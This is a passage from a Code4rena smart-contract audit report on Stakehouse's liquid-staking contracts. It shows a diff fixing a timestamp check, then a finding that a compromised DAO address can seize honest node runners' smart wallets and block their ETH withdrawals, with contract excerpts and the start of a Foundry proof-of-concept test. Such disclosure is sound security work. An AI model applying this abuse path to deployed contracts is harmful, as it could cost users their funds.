data-language=\"\" data-index=\"138\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">diff --git a/contracts/liquid-staking/GiantPoolBase.sol b/contracts/liquid-staking/GiantPoolBase.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">index 8a8ff70..5c009d9 100644</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">--- a/contracts/liquid-staking/GiantPoolBase.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+++ b/contracts/liquid-staking/GiantPoolBase.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">@@ -93,7 +93,7 @@ contract GiantPoolBase is ReentrancyGuard {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         require(_amount &gt;= MIN_STAKING_AMOUNT, &quot;Invalid amount&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         require(_token.balanceOf(address(this)) &gt;= _amount, &quot;Pool does not own specified LP&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-        require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days &lt; block.timestamp, &quot;Too new&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        require(_token.lastInteractedTimestamp(msg.sender) + 1 days &lt; block.timestamp, &quot;Too new&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     /// @dev Allow an inheriting contract to have a hook for performing operations post depositing ETH</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/382\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-26-compromised-or-malicious-dao-can-restrict-actions-of-node-runners-who-are-not-malicious\" style=\"position:relative;\"><a href=\"#m-26-compromised-or-malicious-dao-can-restrict-actions-of-node-runners-who-are-not-malicious\" aria-label=\"m 26 compromised or malicious dao can restrict actions of node runners who are not malicious permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/383\">[M-26] Compromised or malicious DAO can restrict actions of node runners who are not malicious</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/383\">rbserver</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/441\">chaduke</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LSDNFactory.sol#L73-L102\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LSDNFactory.sol#L73-L102</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L239-L246\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L239-L246</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L308-L321\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L308-L321</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L326-L350\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L326-L350</a></p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>When calling the <code>deployNewLiquidStakingDerivativeNetwork</code> function, <code>_dao</code> is not required to be an address that corresponds to a governance contract. This is also confirmed by the code walkthrough at <a href=\"https://www.youtube.com/watch?v=7UHDUA9l6Ek&#x26;t=650s\">https://www.youtube.com/watch?v=7UHDUA9l6Ek&#x26;t=650s</a>, which mentions that <code>_dao</code> can correspond to an address of a single user. Especially when the DAO is set to be an EOA address, it is possible that its private key becomes compromised. Moreover, because the <code>updateDAOAddress</code> function lacks a two step procedure for transferring the DAO’s role, it is possible that the DAO is set to an uncontrolled address, which can be malicious. When the DAO becomes compromised or malicious, the actions of the node runners, who are not malicious, can be restricted at the DAO’s will, such as by calling functions like <code>rotateEOARepresentativeOfNodeRunner</code> and <code>rotateNodeRunnerOfSmartWallet</code>. For example, a compromised DAO can call the <code>rotateNodeRunnerOfSmartWallet</code> function to transfer a smart wallet from a node runner, who is not malicious at all, to a colluded party. Afterwards, the affected node runner is banned from many interactions with the protocol and can no longer call, for instance, the <code>withdrawETHForKnot</code> function for withdrawing ETH from the corresponding smart wallet. Hence, a compromised or malicious DAO can cause severe consequences, including ETH losses.</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LSDNFactory.sol#L73-L102\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LSDNFactory.sol#L73-L102</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"139\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deployNewLiquidStakingDerivativeNetwork</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_dao</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_optionalCommission</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_deployOptionalHouseGatekeeper</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_stakehouseTicker</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Clone a new liquid staking manager instance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newInstance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Clones</span><span class=\"mtk1\">.</span><span class=\"mtk11\">clone</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liquidStakingManagerImplementation</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ILiquidStakingManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newInstance</span><span class=\"mtk1\">).</span><span class=\"mtk11\">init</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_dao</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L239-L246\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L239-L246</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"140\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateDAOAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newAddress</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyDAO</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_newAddress</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Zero address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_newAddress</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">dao</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Same address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">UpdateDAOAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">dao</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_newAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">dao</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_newAddress</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L308-L321\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L308-L321</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"141\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">rotateEOARepresentativeOfNodeRunner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newRepresentative</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyDAO</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_newRepresentative</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Zero address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;No smart wallet&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakedKnotsOfSmartWallet</span><span class=\"mtk1\">[</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Not all KNOTs are minted&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWalletRepresentative</span><span class=\"mtk1\">[</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\">] != </span><span class=\"mtk12\">_newRepresentative</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid rotation to same EOA&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// unauthorize old representative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_authorizeRepresentative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">smartWalletRepresentative</span><span class=\"mtk1\">[</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\">], </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// authorize new representative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_authorizeRepresentative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_newRepresentative</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"142\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">rotateNodeRunnerOfSmartWallet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_current</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_new</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_wasPreviousNodeRunnerMalicious</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_new</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">_current</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_new</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;New is zero or current&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_current</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Wallet does not exist&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_current</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">dao</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Not current owner or DAO&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newRunnerCurrentWallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_new</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newRunnerCurrentWallet</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;New runner has a wallet&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_new</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">nodeRunnerOfSmartWallet</span><span class=\"mtk1\">[</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_new</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_current</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">dao</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_wasPreviousNodeRunnerMalicious</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">bannedNodeRunners</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_current</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NodeRunnerBanned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_current</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NodeRunnerOfSmartWalletRotated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_current</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_new</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L326-L350\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L326-L350</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"143\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdrawETHForKnot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">smartWalletOfKnot</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] == </span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Not the node runner for the smart wallet &quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">isNodeRunnerBanned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunnerOfSmartWallet</span><span class=\"mtk1\">[</span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\">]) == </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Node runner is banned from LSD network&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-41\" style=\"position:relative;\"><a href=\"#proof-of-concept-41\" aria-label=\"proof of concept 41 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please add the following test in <code>test\\foundry\\LSDNFactory.t.sol</code>. This test will pass to demonstrate the described scenario.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"144\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testCompromisedDaoCanRestrictActionsOfNodeRunnersWhoAreNotMalicious</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateDAOAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeStakeAmount</span><span class=\"mtk1\"> = </span><span 